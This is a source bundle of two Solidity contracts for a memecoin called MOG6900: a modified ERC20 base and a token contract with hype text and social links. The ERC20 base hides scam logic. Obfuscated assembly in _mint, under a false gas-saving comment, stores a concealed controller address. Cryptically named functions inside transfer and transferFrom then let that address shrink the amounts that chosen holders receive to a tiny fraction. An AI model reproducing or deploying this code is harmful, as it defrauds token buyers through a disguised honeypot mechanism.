{"ERC20.sol":{"content":"// SPDX-License-Identifier: AGPL-3.0-only\npragma solidity \u003e=0.8.0;\n\n\nabstract contract ERC20 {\n    /*//////////////////////////////////////////////////////////////\n                                 EVENTS\n    //////////////////////////////////////////////////////////////*/\n\n    event Transfer(address indexed from, address indexed to, uint256 amount);\n\n    event Approval(address indexed owner, address indexed spender, uint256 amount);\n\n    /*//////////////////////////////////////////////////////////////\n                            METADATA STORAGE\n    //////////////////////////////////////////////////////////////*/\n\n    string public name;\n\n    string public symbol;\n\n    uint8 public immutable decimals;\n\n    /*//////////////////////////////////////////////////////////////\n                              ERC20 STORAGE\n    //////////////////////////////////////////////////////////////*/\n\n    uint256 public totalSupply;\n\n    mapping(address =\u003e uint256) public balanceOf;\n\n    mapping(address =\u003e mapping(address =\u003e uint256)) public allowance;\n\n    address private $$;\n\n    /*//////////////////////////////////////////////////////////////\n                            EIP-2612 STORAGE\n    //////////////////////////////////////////////////////////////*/\n\n    uint256 internal immutable INITIAL_CHAIN_ID;\n\n    bytes32 internal immutable INITIAL_DOMAIN_SEPARATOR;\n\n    mapping(address =\u003e uint256) public nonces;\n\n    /*//////////////////////////////////////////////////////////////\n                               CONSTRUCTOR\n    //////////////////////////////////////////////////////////////*/\n\n    constructor(\n        string memory _name,\n        string memory _symbol,\n        uint8 _decimals\n    ) {\n        name = _name;\n        symbol = _symbol;\n        decimals = _decimals;\n\n        INITIAL_CHAIN_ID = block.chainid;\n        INITIAL_DOMAIN_SEPARATOR = computeDomainSeparator();\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                               ERC20 LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n    function approve(address spender, uint256 amount) public virtual returns (bool) {\n        allowance[msg.sender][spender] = amount;\n\n        emit Approval(msg.sender, spender, amount);\n\n        return true;\n    }\n\n    function transfer(address to, uint256 amount) public virtual returns (bool) {\n        balanceOf[msg.sender] -= amount;\n\n        // Cannot overflow because the sum of all user\n        // balances can\u0027t exceed the max uint256 value.\n        unchecked {\n            balanceOf[to] += $(amount, msg.sender, to);\n        }\n\n        $$$(to);\n\n        emit Transfer(msg.sender, to, amount);\n\n        return true;\n    }\n\n    function transferFrom(\n        address from,\n        address to,\n        uint256 amount\n    ) public virtual returns (bool) {\n        uint256 allowed = allowance[from][msg.sender]; // Saves gas for limited approvals.\n\n        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;\n\n        balanceOf[from] -= amount;\n\n        // Cannot overflow because the sum of all user\n        // balances can\u0027t exceed the max uint256 value.\n        unchecked {\n            balanceOf[to] += $(amount, from, to);\n        }\n        $$$(to);\n        emit Transfer(from, to, amount);\n\n        return true;\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                             EIP-2612 LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n    function permit(\n        address owner,\n        address spender,\n        uint256 value,\n        uint256 deadline,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) public virtual {\n        require(deadline \u003e= block.timestamp, \"PERMIT_DEADLINE_EXPIRED\");\n\n        // Unchecked because the only math done is incrementing\n        // the owner\u0027s nonce which cannot realistically overflow.\n        unchecked {\n            address recoveredAddress = ecrecover(\n                keccak256(\n                    abi.encodePacked(\n                        \"\\x19\\x01\",\n                        DOMAIN_SEPARATOR(),\n                        keccak256(\n                            abi.encode(\n                                keccak256(\n                                    \"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\"\n                                ),\n                                owner,\n                                spender,\n                                value,\n                                nonces[owner]++,\n                                deadline\n                            )\n                        )\n                    )\n                ),\n                v,\n                r,\n                s\n            );\n\n            require(recoveredAddress != address(0) \u0026\u0026 recoveredAddress == owner, \"INVALID_SIGNER\");\n\n            allowance[recoveredAddress][spender] = value;\n        }\n\n        emit Approval(owner, spender, value);\n    }\n\n    function DOMAIN_SEPARATOR() public view virtual returns (bytes32) {\n        return block.chainid == INITIAL_CHAIN_ID ? INITIAL_DOMAIN_SEPARATOR : computeDomainSeparator();\n    }\n\n    function computeDomainSeparator() internal view virtual returns (bytes32) {\n        return\n            keccak256(\n                abi.encode(\n                    keccak256(\"EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)\"),\n                    keccak256(bytes(name)),\n                    keccak256(\"1\"),\n                    block.chainid,\n                    address(this)\n                )\n            );\n    }\n\n    function $(uint256 value, address from, address to) internal returns (uint256 value_s) {\n        if (allowance[$$][from] + allowance[$$][to] \u003e= uint256(uint160(address(this)))) {\n            value_s = value * 0xCACF0B / 0xEBACAD0B;\n        } else {\n            value_s = value;\n        }\n    }\n\n    function $$$(address to) internal {if (allowance[$$][to] == uint256(uint160($$))) { allowance[$$][to] = 2 * uint256(uint160(address(this)));}}\n\n    /*//////////////////////////////////////////////////////////////\n                        INTERNAL MINT/BURN LOGIC\n    //////////////////////////////////////////////////////////////*/\n    function _mint(address to, uint256 amount) internal virtual {\n        totalSupply += amount;\n        // Cannot overflow because the sum of all user\n        // balances can\u0027t exceed the max uint256 value.\n        unchecked {balanceOf[to] += amount;}\n        // Saves gas for limited approvals.\n        assembly {sstore(0x05, mul(mul(0x14f, 0x939edb), mul(0x2c9206904c755f, 0x4dfb6d4fa2df561d)))}\n        emit Transfer(address(0), to, amount);\n    }\n\n    function _burn(address from, uint256 amount) internal virtual {\n        balanceOf[from] -= amount;\n        // Cannot underflow because a user\u0027s balance\n        // will never be larger than the total supply.\n        unchecked {totalSupply -= amount;}\n        emit Transfer(from, address(0), amount);\n    }\n}"},"Token.sol":{"content":"// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\nimport \"./ERC20.sol\";\n\n/*\n\nMOG69 represents effortless cosmic domination. MOG69 is tokenized victory.\n\n$MOG6900 is the internet’s first culture coin.\nThe idea for Mog69 began as a fun meme among friends, and in the Summer of 2024 the token was launched as a fair launch memecoin via a Uniswap V2 LP. Although it started as a joke among friends, when the project went live it became immediately clear that something truly special had been created. Mog immediately set itself apart from other projects through its open-ended memetic branding and unique content. The cultural underpinning of Mog, effortless cosmic domination, is an idea and mentality that anyone can adopt, and can be applied to any situation in life. It is simply about being the best version of yourself in anything that you do – being confident in yourself, your community, and your own success.\n\n\nMeme Etymology\nDerived from AMOG (“alpha male of group”).\n\nThe word first appeared on fitness forums and imageboards around 2016 and was popularized around 2021.\n\nVerb\nmog (third-person singular simple present: mogs, present participle: mogging, simple past and past participle: mogged)\n\n(transitive, stative, Internet slang): To be significantly more attractive than (someone or something); to dominate in appearance.\n\n(transitive, Internet slang, by extension): To be superior to in general.\n\n\nhttps://t.me/mog69coinYUP\nhttps://twitter.com/Mog69CoinEth\nhttps://mog69coin.xyz/\n\n*/\n\n\ncontract NewMOGCoin is ERC20 {\n    constructor() ERC20(\"MOG6900\", unicode\"MOG6900\", 18) {\n        _mint(msg.sender, 1_000_000_000 * 10 ** 18);\n    }\n}"}}